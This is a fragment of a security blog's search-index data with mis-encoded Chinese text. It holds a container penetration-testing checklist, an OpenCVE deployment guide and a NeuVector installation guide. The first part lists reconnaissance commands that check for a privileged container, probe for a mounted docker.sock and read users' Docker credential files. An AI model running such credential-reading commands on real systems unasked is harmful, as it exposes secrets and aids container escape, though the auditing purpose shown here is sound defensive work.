&#x2F;proc&#x2F;self&#x2F;status\nCAP&#x3D;&#96;grep CapEff &#x2F;proc&#x2F;self&#x2F;status | cut  -f 2&#96;\nif [ &quot;$CAP&quot; &#x3D; &quot;0000003fffffffff&quot; ]; then\n\techo -e &quot;Container is privileged.&quot;\nelse\n\techo -e &quot;Container is not privileged.&quot;\nfi\ncat &#x2F;proc&#x2F;mounts\nenv\ncat &#x2F;proc&#x2F;mounts | grep docker.sock\ncat &#x2F;etc&#x2F;hosts\n\nä»è¿è¡ŒDockerå®ˆæŠ¤è¿›ç¨‹çš„å®¿ä¸»æœºä¸Šå‘èµ·æµ‹è¯•é—®é¢˜ï¼šDockerç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œdocker --versionæŸ¥çœ‹ã€‚æˆ‘ä»¬å¯ä»¥æ®æ­¤åˆ¤æ–­ä¸€äº›å·²çŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚\né—®é¢˜ï¼šå“ªäº›CISæ¡ç›®æ²¡æœ‰è¢«æ­£ç¡®åœ°é…ç½®ï¼Ÿä½¿ç”¨docker-bench-securityæ£€æŸ¥é…ç½®é—®é¢˜ï¼šå“ªäº›ç”¨æˆ·è¢«å…è®¸ä¸Docker Socketäº¤äº’ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œls -l /var/run/docker.sockæ¥æŸ¥çœ‹/var/run/docker.sockæ‰€å±ç”¨æˆ·å’Œç”¨æˆ·ç»„ï¼Œä»¥åŠå“ªäº›ç”¨æˆ·å¯¹å…¶æœ‰è¯»å†™æƒé™ã€‚\né—®é¢˜ï¼šå“ªäº›ç”¨æˆ·åœ¨dockerç”¨æˆ·ç»„ä¸­ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œgrep docker /etc/groupæŸ¥çœ‹ã€‚\né—®é¢˜ï¼šDockerå®¢æˆ·ç«¯å·¥å…·æ˜¯å¦è®¾ç½®äº†setuidæ ‡å¿—ä½ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œls -l $(which docker)æŸ¥çœ‹ã€‚\né—®é¢˜ï¼šå½“å‰å®¿ä¸»æœºä¸Šæœ‰å“ªäº›å¯ç”¨é•œåƒï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œdocker images -aæŸ¥çœ‹ã€‚\né—®é¢˜ï¼šå½“å‰å®¿ä¸»æœºä¸Šæœ‰å“ªäº›å®¹å™¨ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œdocker ps -aæŸ¥çœ‹ã€‚\né—®é¢˜ï¼šDockerå®ˆæŠ¤è¿›ç¨‹æ˜¯å¦‚ä½•å¯åŠ¨çš„ï¼ˆå¸¦äº†å“ªäº›å‚æ•°ï¼‰ï¼Ÿ\næ“ä½œï¼šè¯»å–é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚/usr/lib/systemd/system/docker.serviceå’Œ/etc/docker/daemon.jsonæ¥æŸ¥çœ‹ã€‚\né—®é¢˜ï¼šå½“å‰å®¿ä¸»æœºä¸Šæ˜¯å¦å­˜åœ¨ä¸€äº›docker-compose.yamlæ–‡ä»¶ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œfind / -name &quot;docker-compose.*&quot;æŸ¥çœ‹ã€‚\né—®é¢˜ï¼šå½“å‰å®¿ä¸»æœºä¸Šæ˜¯å¦å­˜åœ¨.docker/config.jsonæ–‡ä»¶ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œcat /home/*/.docker/config.jsonæ¥è¯»å–ä»»ä½•å¯èƒ½å­˜åœ¨çš„.docker/config.jsonæ–‡ä»¶ã€‚\né—®é¢˜ï¼šiptablesè§„åˆ™é›†æ˜¯å¦åŒæ—¶ä¸ºå®¿ä¸»æœºå’Œå®¹å™¨è®¾ç½®ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œiptables -vnLæˆ–iptables -t filter -vnLæŸ¥çœ‹ã€‚\nè‡ªåŠ¨åŒ–è„šæœ¬#!&#x2F;bin&#x2F;bash\n\nls -l &#x2F;var&#x2F;run&#x2F;docker.sock\ngrep docker &#x2F;etc&#x2F;group\nls -l $(which docker)\ndocker images -a\ndocker ps -a\ncat &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;docker.service\ncat &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service\ncat &#x2F;etc&#x2F;docker&#x2F;daemon.json\nfind &#x2F; -name &quot;docker-compose.*&quot;\ncat &#x2F;home&#x2F;*&#x2F;.docker&#x2F;config.json\niptables -t filter -vnL\n\n","slug":"é’ˆå¯¹å®¹å™¨çš„æ¸—é€æµ‹è¯•æ–¹æ³•","date":"2022-04-11T03:36:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"å®¹å™¨å®‰å…¨,ä¼˜ç§€æ–‡ç« æ”¶è—,æ¸—é€æµ‹è¯•","author_index":"Moses"},{"id":"c1f27b84e7a962a64fb70a195391b7ba","title":"å¼€æºæ¼æ´åº“å·¥å…·-OpenCVE","content":"ç®€ä»‹OpenCVEæ˜¯ä¸€ä¸ªå¹³å°ï¼Œç”¨äºæœ¬åœ°å¯¼å…¥CVEåˆ—è¡¨å¹¶å¯¹å…¶è¿›è¡Œæœç´¢ï¼ˆæŒ‰ä¾›åº”å•†ã€äº§å“ã€CVSSã€CWEâ€¦ï¼‰ã€‚\n\né¡¹ç›®åœ°å€OpenCVE\næ–‡æ¡£OpenCVE Documentation\n\nåŸç†\næ•°æ®æº\nCPE:Â https://nvd.nist.gov/feeds/xml/cpe/dictionary/official-cpe-dictionary_v2.3.xml.gz\nCWE:Â https://cwe.mitre.org/data/xml/cwec_latest.xml.zip\nCVE:\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2021.json.gz\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2020.json.gz\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2019.json.gz\n[â€¦]\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2002.json.gz\n\n\n\nAPIå’Œæ•°æ®æºç±»å‹\n\n\nç±»å‹\næè¿°\n\n\n\nCVEå’ŒCPE API\nä¼ ç»Ÿæ¼æ´æ•°æ®æè¦æ–‡ä»¶çš„æ›¿ä»£å“ã€‚ä¸JSONæ¼æ´æè¦å’ŒCPEåŒ¹é…æè¦ç›¸æ¯”ï¼ŒAPIè¦çµæ´»å¾—å¤šï¼Œåœ¨å•ä¸ªç•Œé¢ä¸­æä¾›äº†æ›´ä¸°å¯Œçš„æ•°æ®é›†ã€‚\n\n\nJSONè„†å¼±æ€§ä¿¡æ¯\næ–‡ä»¶ä¸­çš„æ¯ä¸ªæ¼æ´éƒ½åŒ…æ‹¬æ¥è‡ªCVEÂ®è¯å…¸æè¦çš„æè¿°å’Œç›¸å…³å‚è€ƒé“¾æ¥ï¼Œä»¥åŠCVSSåŸºæœ¬åˆ†æ•°ã€æ˜“å—æ”»å‡»çš„äº§å“é…ç½®å’Œå¼±ç‚¹åˆ†ç±»ã€‚\n\n\nCPEæ¯”èµ›Feed\næ ¹æ®å®˜æ–¹CPEè¯å…¸ä¸­çš„CPEåŒ¹é…æä¾›äº§å“&#x2F;å¹³å°é€‚ç”¨æ€§å£°æ˜åˆ°CPE URIåŒ¹é…çš„æè¦ã€‚\n\n\nRSSæ¼æ´Feed\nå…«å¤©çš„å®‰å…¨ç›¸å…³è½¯ä»¶ç¼ºé™·çª—å£ã€‚\n\n\næ¼æ´ç¿»è¯‘Feed\næ¼æ´æè¦çš„ç¿»è¯‘ã€‚\n\n\næ¼æ´ä¾›åº”å•†è¯„è®º\nä¾›åº”å•†å°±å½±å“äº§å“å†…éƒ¨çš„ç‰¹å®šç¼ºé™·æä¾›çš„è¯„è®ºã€‚\n\n\nCPEè¯å…¸\nåŒ…å«äº§å“åˆ—è¡¨çš„è¯å…¸ã€‚\n\n\né€šç”¨é…ç½®æšä¸¾ï¼ˆCCEï¼‰å‚è€ƒæ•°æ®\nå¸¸è§é…ç½®é¡¹çš„å‚è€ƒæ•°æ®ã€‚\n\n\nå®‰è£…æ‰‹åŠ¨å®‰è£…Manual - OpenCVE Documentation\nDocker InstallationThe Docker installation is the method to choose if you want to quickly deploy OpenCVE without managing the dependencies (like PostgreSQL, Redis or Celery).\nRequirementsThe current documentation has been tested on Debian 10 and Ubuntu LTS 20.04 with the following requirements :\n\nDocker-compose 1.21.0+\nDocker 20.10.1+\n5 GB RAM\n\nConfigurationGet the OpenCVE docker repository:\n$ git clone https://github.com/opencve/opencve-docker.git \nPrepare and copy the configuration file from the conf directory:\n$ cd opencve-docker &amp;&amp; cp ./conf/opencve.cfg.example ./conf/opencve.cfg \nUpdate the following keys in the opencve.cfg file:\n\nserver_name (use the same port if you changed it in the .env file)\nsecret_key (see the Flask recommandations)\nsmtp_server\nsmtp_user &amp; smtp_password if any or leave empty\n\nğŸ’¡Tip\nIf you want to change the default postgresql password (strongly advised), you can add it in the .env file before the docker-compose build:\nPOSTGRES_PASSWORD=MyStrongPassword42 \næ„å»ºé•œåƒæ–‡ä»¶$ docker-compose build&#96; \nå¯åŠ¨å®¹å™¨$ docker-compose up -d postgres redis webserver celery_worker\nåˆå§‹åŒ–æ•°æ®åº“$ docker exec -it webserver opencve upgrade-db\nå¯¼å…¥æ•°æ®å¯¼å…¥æ•°æ®å‘½ä»¤\n$ docker exec -it webserver opencve import-data&#96; \n\n\n\n\n\n\n\n\n\nWarningThe NVD data are downloaded, extracted and then parsed in-memory before being inserted in the database. For that the import-data command needs 5GB at least to correctly do its job. Afterwards, the worker use very small memory as only the diff is used with the NVD.If you launch opencve import-data without this memory space the command will be killed (OOM) by your operating system and your data will be incompletes.We wrote a documentation to handle this problem using a SWAP file.\nå¯¼å…¥æ•°æ®é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œä»2002-2022å¹´ï¼ŒCWEæ–‡ä»¶æ¯”è¾ƒå¤§,ç¬¬ä¸€æ¬¡å¯¼å…¥ç»å¸¸æŠ¥é”™ğŸ“¢å¯¼å…¥å¤±è´¥ï¼Œç»ˆæ­¢åŸå› å¯èƒ½æ˜¯ç½‘ç»œé—®é¢˜ï¼ˆä¹‹å‰åˆ†åˆ«ç»ˆæ­¢åœ¨2007å¹´æ•°æ®ã€2010å¹´æ•°æ®ï¼‰ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤dockerå†…å­˜é—®é¢˜åŠå­˜å‚¨ç©ºé—´é—®é¢˜ğŸ“¢å¯¼å…¥å¤±è´¥åï¼Œåˆå§‹åŒ–æ•°æ®åº“æŠ¥é”™\nopencve upgrade-db\nINFO  [alembic.runtime.migration] Context impl PostgresqlImpl.\nINFO  [alembic.runtime.migration] Will assume transactional DDL.\nå¯¹ç­–1ï¼š ä½¿ç”¨docker-composeå‘½ä»¤åœæ­¢å¹¶åˆ é™¤èµ„æºåï¼Œé‡æ–°éƒ¨ç½²ã€‚\ndocker-compose\nOptions:  \n--rmi type åˆ é™¤é•œåƒ,å¯é€‰å‚æ•°all(åˆ é™¤æ‰€æœ‰é•œåƒ),local(åªåˆ é™¤æ²¡æœ‰tagçš„é•œåƒ)  \n-v, --volumes åˆ é™¤å‘½åvolumeså’ŒæŒ‚è½½åˆ°å®¹å™¨ä¸­çš„åŒ¿åvolumes  \n--remove-orphans åˆ é™¤Composeæ–‡ä»¶ä¸­æœªå®šä¹‰çš„æœåŠ¡çš„å®¹å™¨  \n-t, --timeout TIMEOUT Specify a shutdown timeout in seconds. (default: 10)\nå¯¹ç­–2ï¼š æ‰‹åŠ¨å¯¼å…¥æ•°æ®åº“æˆ–è€…ä½¿ç”¨opencveè„šæœ¬ä¸‹è½½å¯¼å…¥åˆ°PostgreSQL\n# ç™»å½•æ•°æ®åº“\npsql postgresql:&#x2F;&#x2F;opencve:opencve@postgres:5432&#x2F;opencve\n# æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“\nopencve-# \\l\n                               List of databases\n   Name    |  Owner  | Encoding |  Collate   |   Ctype    |  Access privileges\n-----------+---------+----------+------------+------------+---------------------\n opencve   | opencve | UTF8     | en_US.utf8 | en_US.utf8 |\n postgres  | opencve | UTF8     | en_US.utf8 | en_US.utf8 |\n template0 | opencve | UTF8     | en_US.utf8 | en_US.utf8 | &#x3D;c&#x2F;opencve         +\n           |         |          |            |            | opencve&#x3D;CTc&#x2F;opencve\n template1 | opencve | UTF8     | en_US.utf8 | en_US.utf8 | &#x3D;c&#x2F;opencve         +\n           |         |          |            |            | opencve&#x3D;CTc&#x2F;opencve\n(4 rows)\n# æŸ¥çœ‹æ•°æ®åº“ä¸­çš„è¡¨\nopencve-# \\d\n             List of relations\n Schema |      Name       | Type  |  Owner\n--------+-----------------+-------+---------\n public | alembic_version | table | opencve\n public | alerts          | table | opencve\n public | alerts_events   | table | opencve\n public | changes         | table | opencve\n public | cves            | table | opencve\n public | cves_tags       | table | opencve\n public | cwes            | table | opencve\n public | events          | table | opencve\n public | metas           | table | opencve\n public | products        | table | opencve\n public | reports         | table | opencve\n public | tasks           | table | opencve\n public | users           | table | opencve\n public | users_products  | table | opencve\n public | users_tags      | table | opencve\n public | users_vendors   | table | opencve\n public | vendors         | table | opencve\n(17 rows)\nCreate an admindocker exec -it webserver opencve create-user admin admin@happycfc.com --admin\nPassword:\nRepeat for confirmation:\n[*] User john created.&#96; \n\n\nStart the beatdocker-compose up -d celery_beat\n\nAPIä½¿ç”¨å…¶REST APIä¸OpenCVEäº¤äº’ã€‚è¯¦è§APIæ–‡æ¡£Introduction - OpenCVE Documentationè¯·æ±‚ç¤ºä¾‹ï¼š\nGET &#x2F;api&#x2F;cve HTTP&#x2F;1.1 Host: example.com Accept: application&#x2F;json\n\n","slug":"æ­å»ºæ¼æ´åº“-OpenCVE","date":"2022-04-08T07:56:44.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"å¼€æºæ¼æ´åº“,éƒ¨ç½²æ‰‹å†Œ,OpenCVE","author_index":"Moses"},{"id":"56dbee3ed1ebfa2e56e8dd9905790f13","title":"å®¹å™¨å®‰å…¨å¹³å°-NeuVector","content":"å¼€æºäº‘åŸç”Ÿäº§å“ç°çŠ¶\n\n\né¡¹ç›®\nå‚å•†\né“¾æ¥\nStar\nç±»å‹\nå¼€æºæ—¶é—´\n\n\n\nclair\nQuay\nhttps://github.com/quay/clair\n8.4k\né•œåƒæ‰«æ\n2015-11-13\n\n\ntrivy\nAqua\nhttps://github.com/aquasecurity/trivy\n10.1k\né•œåƒæ‰«æ\n2019-04-11\n\n\nkube-hunter\nAqua\nhttps://github.com/aquasecurity/kube-hunter/\n3.4k\næ¼æ´æ‰«æ\n2018-07-18\n\n\nkube-bench\nAqua\nhttps://github.com/aquasecurity/kube-bench\n4.5k\nCIS å®‰å…¨åŸºçº¿\n2017-06-19\n\n\nstarboard\nAqua\nhttps://github.com/aquasecurity/starboard\n968\nDashboard\n2020-03-17\n\n\ntracee\nAqua\nhttps://github.com/aquasecurity/tracee\n1.5k\nåŸºäº eBPF çš„ç³»ç»Ÿäº‹ä»¶è¿½è¸ª\n2019-09-18\n\n\nanchore-engine\nanchore\nhttps://github.com/anchore/anchore-engine\n1.4k\næ¼æ´æ‰«æ\n2017-09-06\n\n\nkyverno\nkyverno.io\nhttps://github.com/kyverno/kyverno\n1.8k\nKubernetes ç­–ç•¥ä¸å®¡è®¡\n2019-02-04\n\n\nGateKeeper\nOPA (sysdig)\nhttps://github.com/open-policy-agent/gatekeeper\n1.3k\nKubernetes ç­–ç•¥ä¸å®¡è®¡\n2018-10-26\n\n\nfalco\nfalcosecurity(sysdig)\nhttps://github.com/falcosecurity/falco\n4.4k\nåŸºäºå†…æ ¸æ¨¡å—çš„ç³»ç»Ÿäº‹ä»¶è¿½è¸ªã€è­¦å‘Š\n2016-01-19\n\n\nterrascan\naccurics.com\nhttps://github.com/accurics/terrascan\n2.7k\né€šç”¨çš„ IaS é…ç½®æ‰«æ\n2017-09-11\n\n\nKubei\nportshift\nhttps://github.com/cisco-open/kubei\n489\né•œåƒæ‰«æ(å¸¦é¢æ¿)\n2020-03-22\n\n\nPolaris\nFairwinds\nhttps://github.com/FairwindsOps/polaris\n2.4k\né…ç½®æ‰«æä¸ç­–ç•¥\n2018-11-15\n\n\nkubesec\ncontrolplaneio\nhttps://github.com/controlplaneio/kubesec\n667\nKubernetes é…ç½®æ‰«æ\n2017-10-10\n\n\nKubeEye\nKubeSphere\nhttps://github.com/kubesphere/kubeeye\n424\nåŸºäºç­–ç•¥çš„ Kubernetes é›†ç¾¤é…ç½®æ‰«æ\n2020-11-07\n\n\nkube-linter\nStackrox(RedHat)\nhttps://github.com/stackrox/kube-linter\n1.8k\nKubernetes é…ç½®æ‰«æ\n2020-08-13\n\n\nNeuVectoræ¶æ„\n\nManager, NeuVector çš„ Web æ§åˆ¶å°ï¼Œä¸ºç”¨æˆ·æä¾›äº†ç»Ÿä¸€çš„ç®¡ç† UIï¼Œä¾¿äºç”¨æˆ·æŸ¥çœ‹å®‰å…¨äº‹ä»¶ã€ç®¡ç†å®‰å…¨è§£å†³æ–¹æ¡ˆã€è§„åˆ™ç­‰ã€‚\nController, Backend æœåŠ¡å™¨åŠæ§åˆ¶å™¨ï¼Œç®¡ç†å¦‚ Enforcerã€Scanner ç­‰å…¶ä»–ç»„ä»¶ï¼Œåˆ†å‘å®‰å…¨ç­–ç•¥åŠè°ƒåº¦æ‰«æä»»åŠ¡ã€‚\nScanner, ç”¨æˆ·æ‰§è¡Œæ¼æ´æ‰«æã€åŸºçº¿æ‰«æç­‰ä»»åŠ¡ã€‚\nEnforcer, ä¸€ä¸ªè½»é‡çº§çš„å®¹å™¨ï¼Œç”¨äºæ‹¦æˆªç³»ç»Ÿäº‹ä»¶ï¼Œæ‰§è¡Œå®‰å…¨ç­–ç•¥ç­‰ã€‚é€šå¸¸ä»¥ Daemon set è¿è¡Œå†é›†ç¾¤ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ä¸Šã€‚\nUpdaterï¼Œ ç”¨äºæ›´æ–° CVE æ•°æ®åº“ã€‚\n\nä¸»è¦åŠŸèƒ½\nå®‰å…¨æ¼æ´æ‰«æ\n\nå®¹å™¨ç½‘ç»œæµé‡å¯è§†åŒ–\n\nç½‘ç»œå®‰å…¨ç­–ç•¥å®šä¹‰\n\nL7Â é˜²ç«å¢™\n\nCICDÂ å®‰å…¨æ‰«æ\n\nåˆè§„åˆ†æ\n\n\nå®‰è£…ä½¿ç”¨ helm å®‰è£… NeuVector\nåˆ›å»º namespace\n\nkubectl create namespace neuvector \n\nåˆ›å»º serviceaccount\n\nkubectl create serviceaccount neuvector -n neuvector \n\næ·»åŠ  neuvector çš„ helm ä»“åº“\n\nhelm repo add neuvector https://neuvector.github.io/neuvector-helm/ \n\nå®‰è£… neuvector\n\nhelm install my-neuvector --namespace neuvector neuvector/core \n\n\næ›¿æ¢é•œåƒ\n\n\n\n\n\n\n\n\n\nç”±äº neuvector é•œåƒéœ€è¦æƒé™æ‰èƒ½è·å–ï¼Œè¿™é‡Œå°†é•œåƒæ›¿æ¢ä¸º preview ç‰ˆæœ¬ æ›´å¤šå®‰è£…ä¿¡æ¯è¯·å‚è€ƒï¼šhttps://github.com/neuvector/neuvector-helm/tree/master/charts/core\n\n\nkubectl set image deployment.apps&#x2F;neuvector-controller-pod *&#x3D;neuvector&#x2F;controller.preview:5.0.0-preview.1 -n neuvector\nkubectl set image deployment.apps&#x2F;neuvector-manager-pod *&#x3D;neuvector&#x2F;manager.preview:5.0.0-preview.1 -n neuvector\nkubectl set image deployment.apps&#x2F;neuvector-scanner-pod *&#x3D;neuvector&#x2F;scanner.preview:latest -n neuvector\nkubectl set image daemonset.apps&#x2F;neuvector-enforcer-pod *&#x3D;neuvector&#x2F;enforcer.preview:5.0.0-preview.1 -n neuvector\nkubectl get cronjob&#x2F;neuvector-updater-pod -n neuvector -o yaml | sed &#39;s#image: registry.neuvector.com&#x2F;updater:latest#image: neuvector&#x2F;updater.preview:latest#&#39; | kubectl replace -f -&#96; \n\nHelm-chart å‚æ•°æŸ¥çœ‹\nquick start\nåˆ›å»º namespacekubectl create namespace neuvector\néƒ¨ç½² CRD( Kubernetes 1.19+ ç‰ˆæœ¬)kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;neuvector&#x2F;manifests&#x2F;main&#x2F;kubernetes&#x2F;crd-k8s-1.19.yaml\néƒ¨ç½² CRD(Kubernetes 1.18æˆ–æ›´ä½ç‰ˆæœ¬)kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;neuvector&#x2F;manifests&#x2F;main&#x2F;kubernetes&#x2F;crd-k8s-1.16.yaml\né…ç½® RBACkubectl create clusterrole neuvector-binding-app --verb&#x3D;get,list,watch,update --resource&#x3D;nodes,pods,services,namespaces\nkubectl create clusterrole neuvector-binding-rbac --verb&#x3D;get,list,watch --resource&#x3D;rolebindings.rbac.authorization.k8s.io,roles.rbac.authorization.k8s.io,clusterrolebindings.rbac.authorization.k8s.io,clusterroles.rbac.authorization.k8s.io\nkubectl create clusterrolebinding neuvector-binding-app --clusterrole&#x3D;neuvector-binding-app --serviceaccount&#x3D;neuvector:default\nkubectl create clusterrolebinding neuvector-binding-rbac --clusterrole&#x3D;neuvector-binding-rbac --serviceaccount&#x3D;neuvector:default\nkubectl create clusterrole neuvector-binding-admission --verb&#x3D;get,list,watch,create,update,delete --resource&#x3D;validatingwebhookconfigurations,mutatingwebhookconfigurations\nkubectl create clusterrolebinding neuvector-binding-admission --clusterrole&#x3D;neuvector-binding-admission --serviceaccount&#x3D;neuvector:default\nkubectl create clusterrole neuvector-binding-customresourcedefinition --verb&#x3D;watch,create,get --resource&#x3D;customresourcedefinitions\nkubectl create clusterrolebinding  neuvector-binding-customresourcedefinition --clusterrole&#x3D;neuvector-binding-customresourcedefinition --serviceaccount&#x3D;neuvector:default\nkubectl create clusterrole neuvector-binding-nvsecurityrules --verb&#x3D;list,delete --resource&#x3D;nvsecurityrules,nvclustersecurityrules\nkubectl create clusterrolebinding neuvector-binding-nvsecurityrules --clusterrole&#x3D;neuvector-binding-nvsecurityrules --serviceaccount&#x3D;neuvector:default\nkubectl create clusterrolebinding neuvector-binding-view --clusterrole&#x3D;view --serviceaccount&#x3D;neuvector:default\nkubectl create rolebinding neuvector-admin --clusterrole&#x3D;admin --serviceaccount&#x3D;neuvector:default -n neuvector\næ£€æŸ¥æ˜¯å¦æœ‰ä»¥ä¸‹ RBAC å¯¹è±¡kubectl get clusterrolebinding  | grep neuvector\nkubectl get rolebinding -n neuvector | grep neuvector\n\nkubectl get clusterrolebinding  | grep neuvector\n\nneuvector-binding-admission                            ClusterRole&#x2F;neuvector-binding-admission                            44h\nneuvector-binding-app                                  ClusterRole&#x2F;neuvector-binding-app                                  44h\nneuvector-binding-customresourcedefinition             ClusterRole&#x2F;neuvector-binding-customresourcedefinition             44h\nneuvector-binding-nvadmissioncontrolsecurityrules      ClusterRole&#x2F;neuvector-binding-nvadmissioncontrolsecurityrules      44h\nneuvector-binding-nvsecurityrules                      ClusterRole&#x2F;neuvector-binding-nvsecurityrules                      44h\nneuvector-binding-nvwafsecurityrules                   ClusterRole&#x2F;neuvector-binding-nvwafsecurityrules                   44h\nneuvector-binding-rbac                                 ClusterRole&#x2F;neuvector-binding-rbac                                 44h\nneuvector-binding-view                                 ClusterRole&#x2F;view                                                   44h\n\nkubectl get rolebinding -n neuvector | grep neuvector\nneuvector-admin         ClusterRole&#x2F;admin            44h\nneuvector-binding-psp   Role&#x2F;neuvector-binding-psp   44h\néƒ¨ç½² NeuVectoråº•å±‚ Runtime ä¸º Dockerkubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;neuvector&#x2F;manifests&#x2F;main&#x2F;kubernetes&#x2F;5.0.0&#x2F;neuvector-docker-k8s.yaml\nåº•å±‚ Runtime ä¸º Containerdï¼ˆå¯¹äº k3s å’Œ rke2 å¯ä»¥ä½¿ç”¨æ­¤ yaml æ–‡ä»¶ï¼‰kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;neuvector&#x2F;manifests&#x2F;main&#x2F;kubernetes&#x2F;5.0.0&#x2F;neuvector-containerd-k8s.yaml\n\n1.21 ä»¥ä¸‹çš„ Kubernetes ç‰ˆæœ¬ä¼šæç¤ºä»¥ä¸‹é”™è¯¯ï¼Œå°† yaml æ–‡ä»¶ä¸‹è½½å°† batch&#x2F;v1 ä¿®æ”¹ä¸º batch&#x2F;v1beta1\nerror: unable to recognize &quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;neuvector&#x2F;manifests&#x2F;main&#x2F;kubernetes&#x2F;5.0.0&#x2F;neuvector-docker-k8s.yaml&quot;: no matches for kind &quot;CronJob&quot; in version &quot;batch&#x2F;v1&quot;\n1.20.x cronjob è¿˜å¤„äº beta é˜¶æ®µï¼Œ1.21 ç‰ˆæœ¬å¼€å§‹ cronjob æ‰æ­£å¼ GA ã€‚\né»˜è®¤éƒ¨ç½²web-uiä½¿ç”¨çš„æ˜¯loadblanceç±»å‹çš„Serviceï¼Œä¸ºäº†æ–¹ä¾¿è®¿é—®ä¿®æ”¹ä¸ºNodePortï¼Œä¹Ÿå¯ä»¥é€šè¿‡ Ingress å¯¹å¤–æä¾›æœåŠ¡\nkubectl patch svc neuvector-service-webui -n neuvector --type&#x3D;&#39;json&#39; -p &#39;[&#123;&quot;op&quot;:&quot;replace&quot;,&quot;path&quot;:&quot;&#x2F;spec&#x2F;type&quot;,&quot;value&quot;:&quot;NodePort&quot;&#125;,&#123;&quot;op&quot;:&quot;add&quot;,&quot;path&quot;:&quot;&#x2F;spec&#x2F;ports&#x2F;0&#x2F;nodePort&quot;,&quot;value&quot;:30888&#125;]&#39;\né«˜å¯ç”¨æ¶æ„è®¾è®¡NeuVector-HA ä¸»è¦éœ€è¦è€ƒè™‘ Controller æ¨¡å—çš„ HAï¼Œåªè¦æœ‰ä¸€ä¸ª Controller å¤„äºæ‰“å¼€çŠ¶æ€ï¼Œæ‰€æœ‰æ•°æ®éƒ½å°†åœ¨ 3 ä¸ªå‰¯æœ¬ä¹‹é—´ä¹‹é—´åŒæ­¥ã€‚\nController æ•°æ®ä¸»è¦å­˜å‚¨åœ¨Â &#x2F;var&#x2F;neuvector&#x2F;Â ç›®å½•ä¸­ï¼Œä½†å‡ºç° POD é‡å»ºæˆ–é›†ç¾¤é‡æ–°éƒ¨ç½²æ—¶ï¼Œä¼šè‡ªåŠ¨ä»æ­¤ç›®å½•åŠ è½½å¤‡ä»½æ–‡ä»¶ï¼Œè¿›è¡Œé›†ç¾¤æ¢å¤ã€‚\néƒ¨ç½²ç­–ç•¥NeuVector å®˜æ–¹æä¾›å››ç§ HA éƒ¨ç½²æ¨¡å¼\n\næ–¹å¼ä¸€ï¼šä¸è¿›è¡Œä»»ä½•è°ƒåº¦é™åˆ¶ï¼Œç”± Kubernetes è¿›è¡Œè‡ªç”±è°ƒåº¦ç®¡ç†ç®¡ç†ã€‚\næ–¹å¼äºŒï¼šNeuVector control ç»„ä»¶ (manager,controllerï¼‰+enforceã€scannerç»„ä»¶é…ç½®è°ƒåº¦ label é™åˆ¶å’Œæ±¡ç‚¹å®¹å¿ï¼Œä¸ Kubernetes master èŠ‚ç‚¹éƒ¨ç½²ä¸€èµ·ã€‚\næ–¹å¼ä¸‰ï¼šç»™ Kubernetes é›†ç¾¤ä¸­é€šè¿‡ Taint æ–¹å¼å»ºç«‹ä¸“å±çš„ NeuVector èŠ‚ç‚¹ï¼Œåªå…è®¸ Neuvector control ç»„ä»¶éƒ¨ç½²ã€‚\næ–¹å¼å››ï¼šNeuVector control ç»„ä»¶ (manager,controllerï¼‰é…ç½®è°ƒåº¦ label é™åˆ¶å’Œæ±¡ç‚¹å®¹å¿ï¼Œä¸ Kubernetes master èŠ‚ç‚¹éƒ¨ç½²ä¸€èµ·ã€‚k8s-master ä¸éƒ¨ç½² enforce å’Œ scanner ç»„ä»¶ï¼Œæ„å‘³ç€ master èŠ‚ç‚¹ä¸åœ¨æ¥å—æ‰«æå’Œç­–ç•¥ä¸‹å‘ã€‚\n\næ–¹å¼äºŒéƒ¨ç½²æ ·ä¾‹\nç»™ master èŠ‚ç‚¹æ‰“ä¸Šç‰¹å®šæ ‡ç­¾kubectl label nodes nodename nvcontroller=true\nè·å–èŠ‚ç‚¹ Taintkubectl get node nodename -o yaml|grep -A 5 taint\nä»¥ Rancher éƒ¨ç½²çš„èŠ‚ç‚¹ master èŠ‚ç‚¹ä¸ºä¾‹taints:\n  - effect: NoSchedule\n    key: node-role.kubernetes.io&#x2F;controlplane\n    value: &quot;true&quot;\n  - effect: NoExecute\n    key: node-role.kubernetes.io&#x2F;etcd\nç¼–è¾‘éƒ¨ç½²çš„ yaml ç»™ NeuVector-control ç»„ä»¶ï¼ˆmanager,controllerï¼‰æ·»åŠ  nodeSelector å’Œ tolerations ç»™ enforceã€scanner ç»„ä»¶åªæ·»åŠ  tolerations ã€‚ä¾‹å¦‚ç¼–è¾‘managerç»„ä»¶ï¼škind: Deployment\nmetadata:\n  name: neuvector-manager-pod\n  namespace: neuvector\nspec:\n  selector:\n    matchLabels:\n      app: neuvector-manager-pod\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: neuvector-manager-pod\n    spec:\n      nodeSelector:\n        nvcontroller: &quot;true&quot;\n      containers:\n        - name: neuvector-manager-pod\n          image: neuvector&#x2F;manager.preview:5.0.0-preview.1\n          env:\n            - name: CTRL_SERVER_IP\n              value: 